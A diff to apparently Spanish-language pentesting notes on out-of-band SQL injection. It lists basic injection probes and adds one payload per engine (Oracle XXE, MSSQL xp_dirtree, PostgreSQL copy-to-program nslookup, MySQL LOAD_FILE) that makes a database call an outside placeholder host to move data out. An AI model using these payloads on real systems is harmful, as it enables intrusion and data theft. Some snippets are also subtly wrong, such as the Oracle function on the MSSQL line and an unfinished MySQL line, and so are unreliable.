@@ -210,8 +210,29 @@ def makeSQLI():
 OOB se refiere a que se haga una consulta a un dominio externo a través de la consulta SQL.
 Lo primero que debemos de hacer es identificar el tipo de base de datos con las consultas mas básicas con `'` o también `' or 1=1-- -` o `' or 2=2-- -` o `' and 'a'='a'-- -` o `' and 'b'='a'-- -` o `' order by 4-- -` `' or sleep(5)-- -` o `'||pg_sleep(5)-- -`.
 
-En este tipo de ataque no se reflejara nada por que la vía de extracción de información consta en realizar consultas DNS
+En este tipo de ataque no se reflejara nada por que la vía de extracción de información consta en realizar consultas DNS, para poder concatenar toda la operativa hay que utilizar `union`.
+#### Oracle
+```shell
+SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://URL/">%remote;]>'),'/1') FROM dual
+```
 
+#### MSSQL
+```shell
+SELECT UTL_NADDR.get_host_address('URL') exec master.xp_dirtree '//URL/a'
+```
+
+#### PostgreSQL
+```shell
+copy (SELECT '') to program 'nslookup URL'
+```
+
+#### MySQL
+```shell
+LOAD_FILE('\\\\URL\a') SELECT ... INTO OUTFILE '\\\\URL
+```
+
+
+En el caso de querer extraer información con este ataque realizaremos los siguientes pasos, una vez hemos verificado que es este tipo de ataque 
 
 
 
